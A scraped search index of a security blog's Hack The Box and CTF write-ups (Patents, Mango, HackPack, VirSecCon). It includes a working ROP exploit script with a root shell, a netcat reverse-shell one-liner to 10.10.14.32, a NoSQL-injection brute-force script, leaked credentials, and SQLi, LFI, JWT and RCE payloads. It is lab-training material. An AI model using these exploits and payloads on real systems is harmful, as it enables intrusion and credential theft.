\"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/proc/sys/kernel/randomize_va_space%x00%61%61%61%61%61%61%61%61%62%61%61%61%61%61%61%61%63%61%61%61%61%61%61%61%64%61%61%61%61%61%61%61%65%61%61%61%61%61%61%61%66%61%61%61%61%61%61%61%67%61%61%61%61%61%61%61%68%61%61%61%61%61%61%61%69%61%61%61%61%61%61%61%6a%61%61%61%61%61%61%61%6b%61%61%61%61%61%61%61%6c%61%61%61%61%61%61%61%6d%61%61%61%61%61%61%61%6e%00{}\".format(encode(payload)) request = \"CHECK /{} LFM\\r\\nUser={}\\r\\nPassword={}\\r\\n\\r\\n{}\\n\".format(request, user, password, hash) # log.info('Request: ' + request) return request p = gen() poprdi = 0x405c4b # pop rdi; ret; poprsi = 0x405c49 # pop rsi; pop r15; ret; nop = 0x40251f # nop; ret; rop = p64(poprdi) + p64(fd) + p64(poprsi) + p64(bin.got['dup2']) + p64(0) + p64(nop) + p64(bin.symbols['write']) p.sendline(genRequest(rop)) leak = p.recvall().split('\\n')[4][1:7] leak = u64(leak.ljust(8, '\\x00')) libc.address = leak - libc.symbols['dup2'] log.info(\"Libc base: \" + hex(libc.address)) cont = raw_input('Press Enter to continue.') p = gen() payload = '' payload += p64(poprdi) payload += p64(fd) payload += p64(poprsi) payload += p64(0x0) payload += p64(0x0) payload += p64(bin.symbols['dup2']) payload += p64(poprdi) payload += p64(fd) payload += p64(poprsi) payload += p64(0x1) payload += p64(0x0) payload += p64(bin.symbols['dup2']) payload += p64(poprdi) payload += p64(fd) payload += p64(poprsi) payload += p64(0x2) payload += p64(0x0) payload += p64(bin.symbols['dup2']) rop = '' rop += payload rop += p64(poprdi) rop += p64(1) rop += p64(poprsi) rop += p64(bin.got['dup2']) rop += p64(0) rop += p64(nop) rop += p64(bin.symbols['write']) rop += p64(nop) rop += p64(libc.address + 0x501e3) p.sendline(genRequest(rop)) p.recvrepeat(0.2) p.sendline('id ; hostname') p.interactive() At first I used the hash of lfmserver_user along with the password !gby0l0r0ck$$! to valid the server creds. Here I used two function one to decode and next one to disable the ASLR and overflow the uffer. After buffer was overflowed Address was leaked from GOT to get the libc version. Then used a ROP Chainwith dup2 to get the reverse shell and finally I got the shell. But here a shell was killed after certain sec so I created a new listener and used the reverse shell too and I finally got the shell. root@gr4n173:~/mystuff/htb/patents/repo/$ python exploit.py [*] '/home/gr4n173/mystuff/htb/patents/repo/lfmserver' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [*] '/home/gr4n173/mystuff/htb/patents/repo/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to patents.htb on port 8888: Done [+] Receiving all data: Done (94B) [*] Closed connection to patents.htb port 8888 [*] Libc base: 0x7ff8408a3000 Press Enter to continue. [+] Opening connection to patents.htb on port 8888: Done [*] Switching to interactive mode LFM 200 OK Size: 32 26ab0db90d72e28ad0ba1e22ee510510 \\x9a@V @\\x00\\x00\\x00x\\xa2@\\x89\\x90@ @uid=0(root) gid=0(root) groups=0(root) patents $ ls files firewall.txt lfmserver lfmserver.log $ whoami root $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.14.32 5555 \u003e/tmp/f Listner On: root@gr4n173:~$ nc -lvnp 5555 listening on [any] 5555 ... connect to [10.10.14.32] from (UNKNO","date":"2020-05-16","objectID":"/patents/:6:0","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["ctf"],"content":"I will explain about the pwn challenges that I solved in during CTF.","date":"2020-04-18","objectID":"/hackpacktf/","tags":["linux","ctf","hackpackctf","pwn","BoF","Explotation\u0026Pwning"],"title":"HackPack CTF \"Pwn Challenge\"","uri":"/hackpacktf/"},{"categories":["ctf"],"content":"Playing HackpackCTF was quite a bit fun and enjoying. Here, I will explain about the pwn challenges that I solved during CTF. HackPack CTF HackPack CTF is a security competition that is part of the two security courses at NCSU: CSC-405 Computer Security and CSC-591 Systems Attacks and Defenses. The target audience is people interested in computer security that have some related background (like took a security course before ;) and want to exercise their skills in a secure environment by solving security challenges. For more detail you can visit here. I will talk about the challenges that I solved during live of ctf. ","date":"2020-04-18","objectID":"/hackpacktf/:0:0","tags":["linux","ctf","hackpackctf","pwn","BoF","Explotation\u0026Pwning"],"title":"HackPack CTF \"Pwn Challenge\"","uri":"/hackpacktf/"},{"categories":["ctf"],"content":"Pwn Challenges ","date":"2020-04-18","objectID":"/hackpacktf/:1:0","tags":["linux","ctf","hackpackctf","pwn","BoF","Explotation\u0026Pwning"],"title":"HackPack CTF \"Pwn Challenge\"","uri":"/hackpacktf/"},{"categories":["ctf"],"content":"mousetrap Description[232] Are you savvy enough to steal a piece of cheese? nc cha.hackpack.club 41719 File: mousetrap Solution:- As I run the challenge I was asked to enter the name randomly and then code Sequence but got the output with SNAAAAAAAP! you died!%. Now I grabbed my gdb and analyze the ELF file. gr4n173@root:~# gdb -q mousetrap GEF for linux ready, type `gef' to start, `gef config' to configure 78 commands loaded for GDB 9.1 using Python engine 3.8 [*] 2 commands could not be loaded, run `gef missing` to know why. Reading symbols from mousetrap... (No debugging symbols found in mousetrap) gef➤ checksec mousetrap [*] '/home/gr4n173/pwn/mousetrapfile/mousetrap' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) From this output, RELRO(partial) indicate lazy binding was possible and NX(non-executable) enabled I was unable inject shellcode but Stack No canary found indicated there was buffer overflow. gef➤ info functions All defined functions: Non-debugging symbols: 0x00000000004005a0 _init 0x00000000004005d0 strcpy@plt 0x00000000004005e0 puts@plt 0x00000000004005f0 system@plt 0x0000000000400600 printf@plt 0x0000000000400610 read@plt 0x0000000000400620 setvbuf@plt 0x0000000000400630 _start 0x0000000000400660 _dl_relocate_static_pie 0x0000000000400670 deregister_tm_clones 0x00000000004006a0 register_tm_clones 0x00000000004006e0 __do_global_dtors_aux 0x0000000000400710 frame_dummy 0x0000000000400717 cheeeeeeeese 0x000000000040072a init 0x000000000040078b set_mouse_name 0x00000000004007c1 grab_cheese 0x00000000004007e3 deactivate_trap 0x0000000000400823 menu 0x0000000000400842 main 0x00000000004008c0 __libc_csu_init 0x0000000000400930 __libc_csu_fini 0x0000000000400934 _fini gef➤ Then I break a point in set_mouse_name function and the I run it. gef➤ break set_mouse_name Breakpoint 1 at 0x40078f gef➤ run Starting program: /home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap Welcome little mouse can you steal the cheese from the mouse trap Breakpoint 1, 0x000000000040078f in set_mouse_name () [ Legend: Modified register | Code | Heap | Stack | String ] [ Legend: Modified register | Code | Heap | Stack | String ] ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x00007fffffffdc90 → 0x00000000004008c0 → \u003c__libc_csu_init+0\u003e push r15 $rbx : 0x0 $rcx : 0x00007ffff7ece643 → 0x5577fffff0003d48 (\"H=\"?) $rdx : 0x0 $rsp : 0x00007fffffffdb70 → 0x00007fffffffdcb0 → 0x00000000004008c0 → \u003c__libc_csu_init+0\u003e push r15 $rbp : 0x00007fffffffdb70 → 0x00007fffffffdcb0 → 0x00000000004008c0 → \u003c__libc_csu_init+0\u003e push r15 $rsi : 0x00007ffff7f9d723 → 0xf9f4c0000000000a $rdi : 0x00007fffffffdc90 → 0x00000000004008c0 → \u003c__libc_csu_init+0\u003e push r15 $rip : 0x000000000040078f → \u003cset_mouse_name+4\u003e sub rsp, 0x10 $r8 : 0x2d $r9 : 0x00007ffff7fe3530 → \u003c_dl_fini+0\u003e push rbp $r10 : 0x00007ffff7fef7c0 → \u003cstrcmp+2544\u003e pxor xmm0, xmm0 $r11 : 0x246 $r12 : 0x0000000000400630 → \u003c_start+0\u003e xor ebp, ebp $r13 : 0x00007fffffffdd90 → 0x0000000000000001 $r14 : 0x0 $r15 : 0x0 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffdb70│+0x0000: 0x00007fffffffdcb0 → 0x00000000004008c0 → \u003c__libc_csu_init+0\u003e push r15 ← $rsp, $rbp 0x00007fffffffdb78│+0x0008: 0x000000000040087d → \u003cmain+59\u003e mov rdx, QWORD PTR [rbp-0x8] 0x00007fffffffdb80│+0x0010: 0x00007fffffffdd98 → 0x00007fffffffe120 → \"/home/bikram/mystuff/onlinectf/hackpack/pwn/mouset[...]\" 0x00007fffffffdb88│+0x0018: 0x00000001ffffdcd0 0x00007fffffffdb90│+0x0020: 0x0000000000000000 0x00007fffffffdb98│+0x0028: 0x0000000000000000 0x00007fffffffdba0│+0x0030: 0x00000","date":"2020-04-18","objectID":"/hackpacktf/:1:1","tags":["linux","ctf","hackpackctf","pwn","BoF","Explotation\u0026Pwning"],"title":"HackPack CTF \"Pwn Challenge\"","uri":"/hackpacktf/"},{"categories":["ctf"],"content":"Conclusion:- This challenge include a simple Buffer overflow(BoF) task and had to call a function cheeeeeeeese where /bin/sh was located instead of providing our global offset of /bin/sh. Stay updated to my blog, I will be posting next writeup soon. I started writing a series of Exploitation \u0026 Pwning posts as this is my first post of this series here I explained about BoF. At last but not least I like to thank my friend Linuz for helping me out. I would like to thank all my reader. Feedback Really appreciated in comment below. Stay Safe Keep Learning ","date":"2020-04-18","objectID":"/hackpacktf/:2:0","tags":["linux","ctf","hackpackctf","pwn","BoF","Explotation\u0026Pwning"],"title":"HackPack CTF \"Pwn Challenge\"","uri":"/hackpacktf/"},{"categories":["hackthebox"],"content":"Here I will explain my path for Mango box from Hack The Box.","date":"2020-04-18","objectID":"/mango/","tags":["linux","htb","mongodb","jjs","Nosql"],"title":"Mango","uri":"/mango/"},{"categories":["hackthebox"],"content":"Mango box was the medium box. It falls under linux and medium category. Especially to get user flag was a quite difficult one. I will explain my path for Mango box from Hack The Box. HTB:Mango Mango box was the medium box. It falls under linux and medium category. Especially to get user flag was a quite difficult one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by generating the username and password of adminuser of mongodb. For root, I used jjs command line tool to access the root.txt file. I’ll show all my payload(including that didn’t work in initial deployment to get the root). ","date":"2020-04-18","objectID":"/mango/:0:0","tags":["linux","htb","mongodb","jjs","Nosql"],"title":"Mango","uri":"/mango/"},{"categories":["hackthebox"],"content":"Box Details In above picture IP was 10.10.10.162 and added it to /etc/hosts as mango.htb. Let’s solve this box. ","date":"2020-04-18","objectID":"/mango/:1:0","tags":["linux","htb","mongodb","jjs","Nosql"],"title":"Mango","uri":"/mango/"},{"categories":["hackthebox"],"content":"Recon Let’s start with our universal port scanner, nmap to see the open port and ports SSH(22) HTTP(80) and HTTP(443) are opened. # Nmap 7.80 scan initiated Tue Jan 21 22:10:40 2020 as: nmap -sS -sC -sV -Pn -oN nmap.txt 10.10.10.162 Nmap scan report for 10.10.10.162 Host is up (0.27s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 403 Forbidden 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Mango | Search Base | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ","date":"2020-04-18","objectID":"/mango/:2:0","tags":["linux","htb","mongodb","jjs","Nosql"],"title":"Mango","uri":"/mango/"},{"categories":["hackthebox"],"content":"Web Enumeration mango.htb As soon as I saw port 80 opened I visited the site and got output. So seems like this site wasn’t allowed to visit so I checked the https of that and got a platform which was alike as google. Then I looked everypart of the website and got nothing useful but when I checked for certificate of that website and got staging-order.mango.htb as new domain. so I added that to /etc/hosts and on visiting that domain I found a login page. Everytime when I find login page I will try SQL Injection. But here box name suggest mango so database was mongodb. To understand more about mongodb visit here. Payload for mongodb requires Nosql Injection. After a lot of search I found an interesting git repo where I got the payload for Nosqli. You can find it here. Now I injected NoSql Payload [$ne] in password field and it was vulnerable to NoSqli as I was redirected to /home.php page i.e 302 error. root@gr41n73:~# curl -i -X POST http://staging-order.mango.htb/ -d \"username=mango\u0026password[\\$ne]=^\" -s -o /dev/null -v ...... \u003c Expires: Thu, 19 Nov 1981 08:52:00 GMT \u003c Cache-Control: no-store, no-cache, must-revalidate \u003c Pragma: no-cache \u003c location: home.php \u003c Content-Length: 4022 \u003c Content-Type: text/html; charset=UTF-8 So I found the vulnerable point so I made a simple script with NoSql repo as Script: import requests import string username = 'mango' password = '' url = \"http://staging-order.mango.htb/\" restart = True headers={'content-type': 'application/json'} while restart: restart = False for character in string.printable: if character not in ['*', '+', '.', '?', '|']: payload = password + character post_data = {'username':username, 'password[$regex]':\"^\" + payload, 'login':'login'} r = requests.post(url, data=post_data, allow_redirects=False) if r.status_code == 302: print(payload) restart = True password = payload if len(password) == 16: print(\"\\nMango password: \" + payload) exit(0) break This way I got the password as h3mXK8RhU~f{]f5H which was of mango user. ","date":"2020-04-18","objectID":"/mango/:2:1","tags":["linux","htb","mongodb","jjs","Nosql"],"title":"Mango","uri":"/mango/"},{"categories":["hackthebox"],"content":"Unprivileged User to Privileged User Now I tried ssh into mango user with that creds I got mango shell. root@gr41n73:~# ssh mango@mango.htb The authenticity of host 'mango.htb (10.10.10.162)' can't be established. ECDSA key fingerprint is SHA256:AhHG3k5r1ic/7nEKLWHXoNm0m28uM9W8heddb9lCTm0. Are you sure you want to continue connecting (yes/no/[fingerprint])? uyes Please type 'yes', 'no' or the fingerprint: yes Warning: Permanently added 'mango.htb' (ECDSA) to the list of known hosts. mango@mango.htb's password: Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat Apr 18 09:22:51 UTC 2020 System load: 0.0 Processes: 99 Usage of /: 25.9% of 19.56GB Users logged in: 0 Memory usage: 14% IP address for ens33: 10.10.10.162 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 122 packages can be updated. 18 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sat Apr 18 07:55:54 2020 from 10.10.14.9 mango@mango:~$ whoami mango Then I searched everypart of the shell but nothing was found over there so only thing I remind was the mongodb so I used it. ","date":"2020-04-18","objectID":"/mango/:3:0","tags":["linux","htb","mongodb","jjs","Nosql"],"title":"Mango","uri":"/mango/"},{"categories":["hackthebox"],"content":"Creds Extraction [Mongodb] Now to get the other users creds I searched mongo database with commands. \u003e show dbs admin 0.000GB config 0.000GB local 0.000GB mango 0.000GB \u003e use mango switched to db mango \u003e show tables users \u003e db.getCollection(\"users\").find() { \"_id\" : ObjectId(\"5d8e25334f3bf1432628927b\"), \"username\" : \"admin\", \"password\" : \"t9KcS3\u003e!0B#2\" } { \"_id\" : ObjectId(\"5d8e25364f3bf1432628927c\"), \"username\" : \"mango\", \"password\" : \"h3mXK8RhU~f{]f5H\" } After using admin/t9KcS3\u003e!0B#2 user/password. I got the user shell and flag. root@gr4n173:~# su admin Password: $ python3 -c \"import pty;pty.spawn('/bin/bash')\" To run a command as administrator (user \"root\"), use \"sudo \u003ccommand\u003e\". See \"man sudo_root\" for details. admin@mango:/home/admin$ whoami admin admin@mango:/home/admin$ cat user.txt 79bf31c********************* ","date":"2020-04-18","objectID":"/mango/:3:1","tags":["linux","htb","mongodb","jjs","Nosql"],"title":"Mango","uri":"/mango/"},{"categories":["hackthebox"],"content":"Root Now for root part I upload a simple LinEnum in admin@mango machine and run the script. After I lot of searched in the output of that script I found SUID files owned by user admin admin@mango:/home/admin$ ./LinEnum.sh [-] SGID files: ......... -rwsr-sr-- 1 root admin 10352 Jul 18 2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs jjs tool was owned by user admin as it was a tool which is used to invoke the Nashorn engine. You can find detail here. And for exploit I usually search in gtfobins.io. and I got the exploit for tool jjs. jjs Commands admin@mango:/home/admin/$ echo 'var BufferedReader = Java.type(\"java.io.BufferedReeader\"); \u003e ^C eader\");ngo:/home/admin$ echo 'var BufferedReader = Java.type(\"java.io.BufferedRe jjs\u003e var BufferedReader = Java.type(\"java.io.BufferedReader\"); jjs\u003e var FileReader = Java.type(\"java.io.FileReader\"); jjs\u003e var br = new BufferedReader(new FileReader(\"/root/root.txt\")); jjs\u003e while ((line = br.readLine()) != null) { print(line); } 8a8ef******************** jjs\u003e This way I got the root of mango box and learned alot from this box. So I would like to thank creator of this box MrR3boot for such an awesome box. I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. Feedback are really appreciated !! Tweet about this writeup if you like. You can see more blog at my medium here: gr4n173. ","date":"2020-04-18","objectID":"/mango/:4:0","tags":["linux","htb","mongodb","jjs","Nosql"],"title":"Mango","uri":"/mango/"},{"categories":["ctf"],"content":"Here I will explain all the web challenges that I solved.","date":"2020-04-17","objectID":"/virsecctf_web/","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"Here I will explain all the web challenges that I solved along with the tools used. ","date":"2020-04-17","objectID":"/virsecctf_web/:0:0","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"Web Challenges Web challenge was related to the Php, Server Side Template Injection(SSTI), SQL vulnerability, Jwt etc.. ","date":"2020-04-17","objectID":"/virsecctf_web/:1:0","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"1. Countdown Description [60] We hear something beeping… is there something in the oven? Connect here: http://jh2i.com:50036. Solution:- As I visited the site there was nothing in source-code except defuse.php so I fired my burp-suite and intercepted and got detonate_time cookie as Cookie: detonate_time=1587109772 and changed it more than it was Cookie: detonate_time=99999999999999999999999999 this way I got the flag. ","date":"2020-04-17","objectID":"/virsecctf_web/:1:1","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"2. Hot Access Description [70] Access to all the latest modules, hot off the press! What can you access? Connect here: http://jh2i.com:50016 Solution:- As the challenge name was hotaccess and it was using a simple php module with resources from apache web server. So I checked the date and time got the new paramter http://jh2i.com:50016/?m=modules/date.php Now I accessed .htaccess as ?m=.htaccess which was a default file created by apache in every webserver and got output. On viewing-source code I got sshh_don_tell_i_hid_the_flag_here dir. \u003cDirectory /var/www/html/sshh_dont_tell_i_hid_the_flag_here\u003e AllowOverride All \u003c/Directory\u003e\u003c/pre\u003e \u003c/body\u003e and visited that dir as ?m=sshh_dont_tell_i_hid_the_flag_here/flag.txt. Then I finally got the flag with 70 points. LLS{htaccess_can_control_what_you_access} ","date":"2020-04-17","objectID":"/virsecctf_web/:1:2","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"3. Magician Description [80] Show me a hat trick! Connect here: http://jh2i.com:50000 Solution:- Challenge presents a hash in home page ==0e953532678923638053842468642408. So I tried with md5 decrypt but failed then I looked over the challenge name word ‘Magic Hash’ and got this github repo which was quite interesting one. https://github.com/spaze/hashes/blob/master/md5.md Entering any string of that hash I got the flag. LLS{magic_hashes_make_for_a_good_show} ","date":"2020-04-17","objectID":"/virsecctf_web/:1:3","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"4. PHPJuggler Decription [80] PHP is here to entertain again! They’ve shown you magic tricks, disappearing acts, and now… juggling! Connect here: http://jh2i.com:50030. Solution:- As I visited the site and found a php code which was working in backend. \u003c?php include('flag.php'); if ( isset($_POST['flag']) ){ if ( strcmp( $_POST['flag'], $flag ) == 0 ){ echo(\"You got it! That's the correct flag! \u003cbr\u003e\"); echo($flag); }else{ echo(\"NOPE! Wrong flag.\"); } echo (\"\u003cbr\u003e\u003cbr\u003e\"); } highlight_file(__FILE__); ?\u003e Here I found strcmp() function which compares the strings and that function willn’t handle the array. So I fired my burp-suite and send parameter as an array. This way I got the flag . flag=fsd =» flag[]=fsd Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 6 You got it! That's the correct flag! LLS{php_dropped_the_ball_again} ","date":"2020-04-17","objectID":"/virsecctf_web/:1:4","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"5. GLHF Description [90] LMFAO! FLAG PLZ, THX! Connect here: http://jh2i.com:50014 Solution:- After visiting the challenge I got many urls and I noticed FLAG and submit it as /index.php?page=FLAG and got FLAG???? WTF, PLZ??? On viewing source I got \u003c!-- SRY PHP LFI NBD --\u003e So I php was vulnerable to LFI I brute forced with the wordlist of LFI and got the php://filter/convert.base64-encode/resource=FLAG as lfi injection point. You can visit here for more Juggling tricks. PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg== I tried to decode this and got the flag. root@gr4n173:~# echo \"PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg== \" | base64 -d \u003c?php /* // _______________________________________________________________ LLS{lmfao_php_filters_ftw} // _______________________________________________________________ */ ?\u003e ","date":"2020-04-17","objectID":"/virsecctf_web/:1:5","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"6. JaWT Description [90] Check the admin’s scratchpad! Connect here: http://jh2i.com:50019/ Solution:-On visiting the site I was able to login in as any user except admin so I fired my burp-suite and while intercepting with burp-suite I got the cookie parameter jwt jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.5nMC3j7S-1AH_LuDtr4LQwfnnN_3MiX--d1B07Kt07A Header:- { “alg”: “HS256”, “typ”: “JWT” } Payload:- { “user”: “user” I found a superb website to edit jwt jwt.io. and now requied a secret key for that I used john to crack the jwt root@gr4n173:~#echo \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.DjF2o4bohTFKW9dyR6QfpU397jLnmvITGK8KgCYmXhQ\" \u003e jwt root@gr4n173:~# john jwt Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x]) Will run 4 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist Proceeding with incremental:ASCII fuckit (?) I used that secret key and edited user user =\u003e admin and submited in burp-suite and finally got the flag. LLS{jawt_was_just_what_you_thought} ","date":"2020-04-17","objectID":"/virsecctf_web/:1:6","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"7. Mask Description [90] Take off your mask. Connect here: http://jh2i.com:50023. Solution:-After visiting challenge website I got the Jinja =\u003e Python template so first thing I thought was only Server-Side Template Injection(SSTI). so I tried and I got the 4 as output so then checked for config files. And got the many configuration keys along with secret key ``‘SECRET_KEY’: ‘LLS{server_side_template_injection_unmasked}` This way I got the flag. If you like to read more about SSTI then you can visit here. ","date":"2020-04-17","objectID":"/virsecctf_web/:1:7","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"8. 10 Character Web Shell Description [100] Only 10 char– Connect here: http://jh2i.com:50001. Solution:- After visiting the challenge I got a simple php backend code. \u003c?php $c = $_GET[c]; if(strlen($c) \u003c 10){ echo shell_exec($c); }else{ echo \"too long!\"; } highlight_file(__FILE__); ?\u003e and used paramter as http://jh2i.com:50001/?c=cat flag* LLS{you_really_can_see_in_the_dark} This way I got the flag . ","date":"2020-04-17","objectID":"/virsecctf_web/:1:8","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"9. Sequelitis Description [100] Sequelitis has moved to a new database for keeping track of their customers. Break in. Connect here: http://jh2i.com:50034. Solution:- As the challenge name Sequelitis which indicate there was sqli. So at first I tried a simple payload ' or 1==1 -- didn’t work and slightly changed to 'or 1==1 -- - I got the output Trey Maxam: 1010 Joe Benin: 2001 Grant Wyman: 1337 John Hammond: 1785 So after alot of checking the table and columns my final payload to get flag was ' union select value,2,3 from flag -- - LLS{explicit_sqli_is_how_sql_will_die} 2: 3 ","date":"2020-04-17","objectID":"/virsecctf_web/:1:9","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"10. Dairy Products Description [100] There is a new advertising campaign on the classic dairy company’s website. You need to steal their latest product. Connect here: http://142.93.3.19:50008 Solution:- As soon as I visited the challenge got the hint as git milk and checked .git dir which gave me a git repo. Then I download to my localmachine . root@gr4n173:~# wget -r –no-parent http://142.93.3.19:50008/.git/ after that downloaded I used the command as root@gr4n173:~# git log | grep commit | awk '{print $2}' | while read line;do git show $line;done | grep -i \"{.*}\" +LLS{you_gitm_gotm_good_partner} +for i in {1..10} git log =\u003e It gives the commit history. grep commit =\u003e It grep the commit only . awk ‘{print $2}’ =\u003e It just takes the commitsha. while read line;do git show $line; =\u003e it makes a loop for every shacommit and show all the commit . grep -i “{.*}” =\u003e It grep the flag. This way I solved the challenge and got 100 points. ","date":"2020-04-17","objectID":"/virsecctf_web/:1:10","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"11. Irregular Expressions Description [100] Check out our new regular expressions testbed! Now you can test your regex online at! Connect here: http://jh2i.com:50018/ Solution:- After visiting the website and viewing the source code I got this. \u003cb\u003eWarning\u003c/b\u003e: preg_replace(): Unknown modifier '\\' in \u003cb\u003e/var/www/html/index.php\u003c/b\u003e on line \u003cb\u003e39\u003c/b\u003e\u003cbr /\u003e as pre_replace() there you can find /emodifier to run the eval() command so I used it this way I can run the RCE so I used system('ls -al'); to get the files. total 16 